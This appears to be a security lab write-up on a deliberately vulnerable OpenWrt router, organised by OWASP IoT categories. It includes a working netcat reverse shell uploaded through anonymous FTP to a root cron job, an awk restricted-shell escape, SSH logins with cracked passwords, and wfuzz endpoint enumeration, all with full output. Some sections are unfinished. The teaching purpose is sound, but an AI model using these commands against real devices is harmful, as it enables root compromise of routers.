The device implements automatic firmware updates but lacks cryptographic verification of the update package. The update mechanism accepts unsigned images from arbitrary locations (FTP/HTTP), allowing attackers to flash malicious firmware that persists across reboots.

The connection to the directory via FTP does not reveal any clues that would allow the attacker to know where they are accessing, but this could be discovered through static analysis of the firmware. However, we do find text that appears to be related to the functionality of this service.

```zsh
$ ftp 192.168.2.1
Connected to 192.168.2.1.
220 Operation successful
Name (192.168.2.1:d4str3k): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get README.txt
local: README.txt remote: README.txt
229 EPSV ok (|||39489|)
150 Opening BINARY connection for README.txt (684 bytes)
100% |*********************************************************|   684       10.19 MiB/s    00:00 ETA
226 Operation successful
684 bytes received in 00:00 (3.21 MiB/s)
ftp> exit
221 Operation successful

$ cat README.txt 
========================================
OEM FIRMWARE UPDATE SERVER - STAGING
========================================
Location: /opt/oem-updates/pending/
User: anonymous (write-enabled)

SUPPORTED FILE TYPES:
  *.img    - Standard OpenWRT firmware images (sysupgrade)
  *.sh     - Pre-installation hooks/preparation scripts

INSTRUCTIONS:
1. Upload firmware files (*.img) to this directory
2. System auto-processes every 3 minutes via root cron
3. Files are automatically executed/installed and deleted

WARNING: Ensure compatibility with RoutCoon hardware.
Invalid files may cause system instability.

For support: contact@routcoon-oem.local
========================================   
```

We now know that this directory contains the scripts and binary files that execute the update on the vulnerable router. This document tells us that pre-installation scripts are run to prepare for the update, so we can try to see if the mechanism responsible for executing these scripts validates them or if, on the contrary, we can execute commands remotely.

In this case, commands can be executed remotely, so we can obtain a forward shell by using netcat and mkfifo with the following script.  We open a connection this way since OpenWRT uses BusyBox, so it does not have /dev/tcp implemented.

```sh
#!/bin/ash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.2 9001 > /tmp/f
```

We use FTP to upload the script to the */tmp/cron-tmp* folder and wait for the script to run.

```shell
$ ftp 192.168.2.1
Connected to 192.168.2.1.
220 Operation successful
Name (192.168.2.1:d4str3k): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put script.sh 
local: script.sh remote: script.sh
229 EPSV ok (|||43203|)
150 Ok to send data
100% |*********************************************************|    95      779.60 KiB/s    00:00 ETA
226 Operation successful
95 bytes sent in 00:00 (130.85 KiB/s)
ftp> exit
221 Operation successful

$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 192.168.2.1 54916


/bin/sh: can't access tty; job control turned off
BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ # id
uid=0(root) gid=0(root) groups=0(root)
~ # whoami
root
~ # ls
vulnzoo.log
~ # 
```
# IoT:I5: Using Insecure or Outdated Components
## Definition

> Use of deprecated or insecure software components/libraries that could allow the device to be compromised. This includes insecure customization of operating system platforms, and the use of third-party software or hardware components from a compromised supply chain.

**ID:** `IoT5-001`  
**Severity:** High  
**Affected Component:** SSH Service (Dropbear)  
**Firmware Version:** OpenWrt 24.10.3 (Custom/VulnZoo)

---

> **NEEDS CHECK: Overlaps with [[IoT Vulnerabilities#IoT I3 - Insecure Ecosystem Interfaces]]**

By using wordlists for endpoints, we can find out firsthand that there is a `/cgi-bin/luci/admin` subroutine. This is revealed by the fact that we get a `Forbidden 403` code, compared to non-existent routes that report a `Not Found 404`.

```bash
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/FUZZ"      
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/FUZZ
Total requests: 3

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   404        54 L     121 W      1658 Ch     "foobar"                                                                                                                     
000000001:   404        54 L     121 W      1658 Ch     "system"                                                                                                                     
000000002:   403        90 L     207 W      2889 Ch     "admin"                                                                                                                      

Total time: 0
Processed Requests: 3
Filtered Requests: 0
Requests/sec.: 0
```

However, due to the configuration of `dispatcher.lua`, starting from a valid subroutine, the rest of the subdirectories do not report a `Not Found` error even if they do not exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ"                                            
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   403        91 L     208 W      2897 Ch     "foobar"                                                                                                                     
000000002:   403        91 L     208 W      2896 Ch     "admin"                                                                                                                      
000000001:   403        91 L     208 W      2897 Ch     "system"                                                                                                                     
000000004:   403        91 L     208 W      2896 Ch     "tried"                                                                                                                      

Total time: 0.158685
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 25.20710
```

We cannot differentiate between which endpoints exist and which do not based on what the server reports. However, if we test the interface a little, we notice some strange behavior.

![[iot3_interface_exposes_endpoint.png]]

If we try to access a directory that is unlikely to exist, such as `/cgi-bin/luci/admin/foobar`, we see a message overlaying that the resource does not exist. If we try fuzzing with incorrect login data, we can see that there are changes between different requests, which tells us which subroutes exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   403        94 L     219 W      3005 Ch     "system"                                                                                                                     
000000003:   403        98 L     231 W      3109 Ch     "foobar"                                                                                                                     
000000002:   403        98 L     231 W      3108 Ch     "admin"                                                                                                                      
000000004:   403        98 L     231 W      3108 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0


```

As you can see, subroutes that do not have the message take up less space, and despite the `Forbidden` code in all requests, it is now possible to discern which ones do exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   403        94 L     219 W      3011 Ch     "admin"                                                                                                                      
000000003:   403        98 L     231 W      3116 Ch     "foobar"                                                                                                                     
000000001:   403        94 L     219 W      3012 Ch     "system"                                                                                                                     
000000004:   403        98 L     231 W      3115 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0
```

We have obtained the endpoints `/cgi-bin/luci/admin/system/admin` and `/cgi-bin/luci/admin/system/system`.

---

![[iot5_no-ssh-keys.png]]

Initially, we find that we cannot access the router directly as root due to a device policy issue. We have more information on why this is the case in [[IoT Vulnerabilities#IoT I9 - Insecure Default Settings|IoT9]].

![[iot5_ssh_root_failed.png]]

If we analyze the interface a little, we can start with an analysis of the router's response and realize that there are two headers that suggest that parts of the router interface API are part of the development team's debugging.

![[iot5_x_debug_mode.png]]

Hemos analizado la interfaz web realizando un fuzzing externo, comprobando que se pueden filtrar algunos endpoints que son accesibles como `/api` y `/tools`. Por otro lado, encontramos un endpoint `/debug` que hace referencia a la cabecera anteriormente encontrada que exponía la posibilidad de endpoints de *debugging* que no han sido correctamente ocultados o eliminados.

![[iot5_interface_fuzzing.png]]

We can find another subdirectory that completes an already usable path through another analysis with `wfuzz`:

![[iot5_debug_ssh.png]]



![[iot5_ssh_key_injection.png]]


# IoT:I6 - Insufficient privacy protection
## Definition
> User's personal information stored on the device or in the ecosystem that is used insecurely improperly, or without permission.
> **NOT DEVELOPED**
# IoT:I7 - Insecure Data Transfer and Storage
## Definition
> Lack of encryption or access control of sensitive data anywhere within the ecosystem, including at rest, in transit, or during processing.
> **NOT DEVELOPED**
# IoT:I8 - Lack of device management
## Definition
> Lack of security support on devices deployed in production, including asset management, update management, secure decommissioning, systems monitoring, and response capabilities.
> **NOT DEVELOPED**
# IoT:I9 - Insecure Default Settings
## Definition
> Devices or systems shipped with insecure default settings or lack the ability to make the system more secure by restricting operators from modifying configurations.
### Restricted shell bypass

The `openwrtuser` account is a non-privileged user on the router. The system includes multiple user accounts, but the most relevant are `openwrtuser`, `root`, and `anonymous`. The `anonymous` user is used for anonymous logins to the **FTP** service. In contrast, `openwrtuser` has highly restricted permissions, with the ability to list certain parts of the system and a restricted shell that limits the available commands. This user was created to serve as a bridge account.

For security reasons, direct SSH access to an embedded device as the administrator or `root` user should be avoided. Disabling SSH access for `root` is not a common practice in IoT devices, but it should be adopted to enhance security.

Many IoT product developers do not implement this practice for several reasons:

1. **Simplicity:** Managing a single user is easier.
2. **Storage constraints:** Adding sudo/su increases memory usage.
3. **Technical support:** It is simpler to instruct users to "log in as root."
4. **Legacy compatibility:** Many legacy scripts assume the use of the `root` account.
5. **Cost:** The primary focus is product functionality; security hardening is often considered an unnecessary expense, leading to common security weaknesses.

In enterprise devices, where security is critical due to the potential for revenue loss and reputational damage, more robust security mechanisms are implemented. For example, Cisco network devices employ a hierarchical two-level command execution model that is considered an industry standard:

1. **User EXEC Mode (Non-privileged):** Allows access only to basic diagnostic and viewing commands.
2. **Privileged EXEC Mode (Privileged):** Grants full access to all commands.

These modes are not mutually exclusive; administrators must first access user mode and then authenticate to escalate to privileged mode.

A similar approach has been implemented in this laboratory. SSH access as the `root` user has been disabled on the device.

```zsh
config dropbear
        option Interface 'lan'
        option PasswordAuth 'on'
        option RootPasswordAuth 'off'
        option Port '22'
        # option BannerFile '/etc/banner'
        option MaxAuthTries '3'
        option RecvWindowSize '1048576'
        option SendWindowSize '1048576'

        # Security settings for management
        # option IdleTimeout '300'
        option enable '1'
```

An administrator can only obtain `root` access by first logging in via SSH as `openwrtuser` and then escalating privileges to `root` from within the session using `su` command.

The primary risk in this scenario lies in the restricted shell assigned to the `openwrtuser` account. As previously demonstrated in the section [[IoT Vulnerabilities#IoT I1 - Weak, Guessable, or Hardcoded Passwords]], the user's password can be cracked using the username and a common brute-force dictionary. Additionally, physical access methods are possible, as detailed in [[IoT Vulnerabilities#IoT I10 - Lack of Physical Hardening]], and the firmware can also be obtained for further analysis ([see reference](https://github.com/scriptingxss/owasp-fstm)).

Once access is gained, a user can analyze the behavior of the deployed shell. This can be achieved by reviewing the source code in the repository or by locating and extracting the binary for reverse engineering. The _rshell_ implementation permits the execution of the `awk` command without proper validation.

According to [GTFobins](https://gtfobins.github.io/gtfobins/awk/), it is possible to leverage `awk` to spawn a shell.

```zsh
awk 'BEGIN {system("/bin/sh")}'
```

There are various methods to attempt bypassing a restricted shell. This [resource](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) lists several techniques, including the use of `awk`.

## Demonstration

```zsh
$ sshpass -p "incrackeable" ssh root@192.168.2.1                                                 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Permission denied, please try again.
```

```zsh
$ sshpass -p "openwrtuserpwned" ssh openwrtuser@192.168.2.1
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

██████╗ ███████╗███████╗████████╗██████╗ ██╗ ██████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗  ███████╗   ██║   ██████╔╝██║██║        ██║   █████╗  ██║  ██║
██╔══██╗██╔══╝  ╚════██║   ██║   ██╔══██╗██║██║        ██║   ██╔══╝  ██║  ██║
██║  ██║███████╗███████║   ██║   ██║  ██║██║╚██████╗   ██║   ███████╗██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚═════╝ 
                                                                              
 ██████╗███████╗██╗  ██╗███████╗██╗     ██╗                                  
██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║                                  
██║     ███████╗███████║█████╗  ██║     ██║                                  
██║     ╚════██║██╔══██║██╔══╝  ██║     ██║                                  
╚██████╗███████║██║  ██║███████╗███████╗███████╗                             
 ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                             

===============================================================================
                         RESTRICTED ACCESS SHELL
===============================================================================

╔═══════════════════════════════════════════════════════════════════════════╗
║ WARNING: UNAUTHORIZED ACCESS IS PROHIBITED                                ║
║                                                                           ║
║ This system is for authorized use only. All activities on this system     ║
║ are monitored and logged. Any unauthorized access, use, or modification   ║
║ is strictly prohibited and may result in disciplinary action and/or       ║
║ criminal prosecution under applicable laws.                               ║
║                                                                           ║
║ By accessing this system, you acknowledge that:                           ║
║  • You have no expectation of privacy                                     ║
║  • All keystrokes and commands are logged                                 ║
║  • System administrators may monitor activity at any time                 ║
╚═══════════════════════════════════════════════════════════════════════════╝

Use 'help' command to see the list of allowed commands.

===============================================================================
rshell> netstat 
Command not allowed nor found.
rshell> awk 'BEGIN {system("/bin/sh")}'


BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ $
~ $ netstat -tulnp
netstat: can't scan /proc - are you root?
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.2.1:22          0.0.0.0:*               LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      -
tcp        0      0 :::5515                 :::*                    LISTEN      -
udp        0      0 :::547                  :::*                                -
```


### FTP configuration and escalation

There are multiple insecure configurations present on the device, one of the most critical being the configuration of the [[IoT Vulnerabilities#FTP|FTP]] service. This service allows any user logging in as _anonymous_ to upload executable files to the _/tmp_ directory. This creates a significant attack surface for the execution of malware or ransomware.

To mitigate this issue, it is recommended to create a dedicated directory for the FTP service, restrict access to prevent anonymous logins, and mount the directory used for file uploads with the _noexec_ option to prevent execution of uploaded files.*

```zsh
mount -o remount,noexec /tmp/ftp
```
### Exposed services running as root

Existen en el router servicios que se ejecutan bajo el usuario `root`, lo cual abre una superficie vulnerable a que si se vulnera el servicio se puede obtener acceso privilegiado directo.
## IoT:I10 - Lack of Physical Hardening
### Definition
> Lack of physical hardening measures, allowing potential attackers to gain sensitive information that can help in a future remote attack or take local control of the device.
> **NOT DEVELOPED**
